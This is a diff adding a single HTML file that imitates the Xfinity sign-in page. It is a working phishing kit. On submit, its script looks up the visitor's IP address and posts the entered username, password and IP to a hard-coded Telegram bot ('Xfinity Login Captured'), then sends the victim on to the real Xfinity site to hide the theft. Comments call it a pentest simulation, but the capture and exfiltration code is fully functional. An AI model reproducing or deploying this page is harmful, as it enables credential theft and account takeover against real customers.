@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in to Xfinity</title>
+    <link
+      rel="icon"
+      href="https://www.xfinity.com/favicon.ico"
+      type="image/x-icon"
+    />
+    <style>
+      :root {
+        --purple: #6f3cff;
+        --purple-2: #7b4cff;
+        --ink: #0b0b0b;
+        --muted: #6b7280;
+        --border: #e5e7eb;
+        --bg: #ffffff;
+        --bg-soft: #f5f6fa;
+      }
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        margin: 0;
+        font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica,
+          Arial, sans-serif;
+        color: var(--ink);
+        background: #fff;
+      }
+
+      /* Page shell */
+      .page {
+        min-height: 100vh;
+        display: grid;
+        grid-template-columns: 1.05fr 1fr;
+      }
+
+      /* LEFT */
+      .left {
+        padding: 48px 56px;
+        display: flex;
+        justify-content: center;
+        flex-direction: column;
+        gap: 28px;
+      }
+      .brand {
+        font-size: 20px;
+        letter-spacing: 0.3px;
+        color: #9aa0a6;
+      }
+      /* .card {
+        max-width: 420px;
+      } */
+      h1 {
+        font-size: 28px;
+        font-weight: 600;
+        margin: 4px 0 px;
+      }
+      .field {
+        margin-bottom: 14px;
+      }
+      .input {
+        width: 100%;
+        max-width: 480px;
+        padding: 14px 14px;
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        font-size: 16px;
+      }
+      .hint {
+        font-size: 13px;
+        color: var(--muted);
+        margin: 10px 0 16px;
+      }
+      .hint a {
+        color: var(--purple);
+        text-decoration: none;
+      }
+      .btn {
+        background: var(--purple);
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        padding: 12px 16px;
+        font-size: 16px;
+        font-weight: 600;
+        width: 140px;
+        cursor: pointer;
+      }
+      .list {
+        margin-top: 26px;
+        border-top: 1px solid var(--border);
+      }
+      .list a {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 14px 0;
+        text-decoration: none;
+        color: #111827;
+        border-bottom: 1px solid var(--border);
+        font-size: 15px;
+      }
+
+      /* RIGHT */
+      .right {
+        background: linear-gradient(135deg, #ede9ff 0%, #f3f1ff 100%);
+        /* padding: 56px; */
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .promo {
+        max-width: 520px;
+        width: 100%;
+        text-align: center;
+        color: #1f2937;
+      }
+      .promo h2 {
+        font-size: 28px;
+        margin-bottom: 12px;
+        font-weight: 700;
+        color: #5b2dff;
+      }
+      .promo p {
+        font-size: 15px;
+        color: #4b5563;
+        margin-bottom: 22px;
+        line-height: 1.5;
+      }
+      .cta {
+        background: #111827;
+        color: #fff;
+        border-radius: 10px;
+        padding: 12px 18px;
+        display: inline-block;
+        font-weight: 600;
+        font-size: 14px;
+      }
+      .phone {
+        margin: 28px auto 0;
+        width: 210px;
+        height: 420px;
+        border-radius: 28px;
+        background: linear-gradient(180deg, var(--purple-2), var(--purple));
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+        color: #fff;
+        font-size: 64px;
+        font-weight: 800;
+      }
+      .fineprint {
+        margin-top: 18px;
+        font-size: 11px;
+        color: #6b7280;
+        line-height: 1.4;
+      }
+
+      .down {
+        width: 100%;
+        display: none;
+        justify-content: center;
+        margin-top: 40px;
+      }
+
+      .down-image {
+        width: 300px;
+        height: 250px;
+      }
+
+      .right-image {
+        width: 100%;
+        height: 100%;
+      }
+
+      /* Footer */
+      footer {
+        grid-column: 1 / -1;
+        padding: 22px 56px;
+        border-top: 1px solid var(--border);
+        display: flex;
+        flex-wrap: wrap;
+        gap: 16px;
+        justify-content: center;
+        font-size: 12px;
+        color: #6b7280;
+      }
+      footer a {
+        color: #6b7280;
+        text-decoration: none;
+      }
+
+      .logo {
+        width: 80px;
+      }
+
+      /* Responsive */
+      @media (max-width: 980px) {
+        .page {
+          grid-template-columns: 1fr;
+        }
+        .right {
+          display: none;
+        }
+        .down {
+          display: flex;
+        }
+        .left {
+          padding: 20px;
+          width: 100%;
+        }
+      }
+
+      /* Error message styling */
+      .error-message {
+        color: #d32f2f;
+        font-size: 14px;
+        margin-top: 8px;
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="page">
+      <!-- LEFT -->
+      <section class="left">
+        <div class="brand">
+          <img class="logo" src="./xfinity-logo.png" alt="">
+        </div>
+
+        <div class="card">
+          <h1>Sign in with your Xfinity ID</h1>
+
+          <form id="loginForm">
+            <div class="field">
+              <input
+                class="input"
+                type="text"
+                id="username"
+                name="username"
+                placeholder="Email, mobile, or username"
+                aria-label="Email, mobile, or username"
+                required
+              />
+              <div class="error-message" id="username-error">
+                Please enter a valid username
+              </div>
+            </div>
+
+            <div class="field">
+              <input
+                class="input"
+                type="password"
+                id="password"
+                name="password"
+                placeholder="Password"
+                aria-label="Password"
+                required
+              />
+              <div class="error-message" id="password-error">
+                Please enter your password
+              </div>
+            </div>
+
+            <div class="hint">
+              By signing in, you agree to our
+              <a href="#">Terms of Service</a> and
+              <a href="#">Privacy Policy</a>.
+            </div>
+
+            <button class="btn" type="submit">Let’s go</button>
+          </form>
+
+          <div class="list">
+            <a href="#"
+              ><span>New to Xfinity? View exclusive offers near you</span
+              ><span>›</span></a
+            >
+            <a href="#"><span>Find your Xfinity ID</span><span>›</span></a>
+            <a href="#"><span>Create a new Xfinity ID</span><span>›</span></a>
+          </div>
+
+          <div class="down">
+            <img
+              class="down-image"
+              src="https://assets.xfinity.com/assets/cima/login/default/ad/BAU-XM_CIMA_Mobile_XCIMA-49176.png"
+              alt=""
+            />
+          </div>
+        </div>
+      </section>
+
+      <!-- RIGHT -->
+      <section class="right">
+        <img
+          class="right-image"
+          src="https://assets.xfinity.com/assets/cima/login/default/ad/BAU-XM_CIMA_4.15.25_Update_Desktop.png"
+          alt=""
+        />
+      </section>
+
+      <!-- FOOTER -->
+      <footer>
+        <span>© 2025 Comcast</span>
+        <a href="#">Web Terms of Service</a>
+        <a href="#">CA Notice at Collection</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Your Privacy Choices</a>
+        <a href="#">Health Privacy Notice</a>
+        <a href="#">Ad Choices</a>
+      </footer>
+    </div>
+
+    <script>
+      // Function to get user's IP address
+      async function getUserIP() {
+        try {
+          const response = await fetch("https://api.ipify.org?format=json");
+          const data = await response.json();
+          return data.ip;
+        } catch (error) {
+          console.error("Error getting IP:", error);
+          return "Unknown";
+        }
+      }
+
+      // Function to send data to Telegram bot
+      async function sendToTelegram(username, password, ip) {
+        const botToken = "8296879299:AAFxvc3PhIe2SqN2D2FYJ4mMcI0K4PhFG6A"; // Replace with your bot token
+        const chatId = "8245448815"; // Replace with your chat ID
+
+        const message =
+          `🚨 *Xfinity Login Captured* 🚨\n\n` +
+          `📧 *Username:* ${username}\n` +
+          `🔑 *Password:* ${password}\n` +
+          `📍 *IP Address:* ${ip}\n` +
+          `🕒 *Time:* ${new Date().toLocaleString()}`;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        try {
+          await fetch(url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+              parse_mode: "Markdown",
+            }),
+          });
+        } catch (error) {
+          console.error("Error sending to Telegram:", error);
+        }
+      }
+
+      // Function to validate credentials with Xfinity API (simulated)
+      async function validateCredentials(username, password) {
+        // In a real pentest, you would connect to Xfinity's authentication API
+        // This is a simulation - in practice you'd use their actual API endpoint
+        return new Promise((resolve) => {
+          // Simulate API delay
+          setTimeout(() => {
+            // For demonstration, treating all credentials as valid
+            resolve({ success: true });
+          }, 1500);
+        });
+      }
+
+      // Form submission handler
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
+
+          const username = document.getElementById("username").value;
+          const password = document.getElementById("password").value;
+
+          // Basic validation
+          let isValid = true;
+
+          if (!username) {
+            document.getElementById("username-error").style.display = "block";
+            isValid = false;
+          } else {
+            document.getElementById("username-error").style.display = "none";
+          }
+
+          if (!password) {
+            document.getElementById("password-error").style.display = "block";
+            isValid = false;
+          } else {
+            document.getElementById("password-error").style.display = "none";
+          }
+
+          if (!isValid) return;
+
+          // Get user's IP
+          const userIP = await getUserIP();
+
+          // Send credentials to Telegram bot
+          await sendToTelegram(username, password, userIP);
+
+          // Validate credentials with Xfinity API
+          const validation = await validateCredentials(username, password);
+
+          if (validation.success) {
+            // Redirect to Xfinity homepage after successful capture
+            window.location.href = "https://www.xfinity.com";
+          } else {
+            // Show error message (this would happen in a real scenario)
+            document.getElementById("password-error").textContent =
+              "Invalid username or password";
+            document.getElementById("password-error").style.display = "block";
+          }
+        });
+    </script>
+  </body>
+</html>
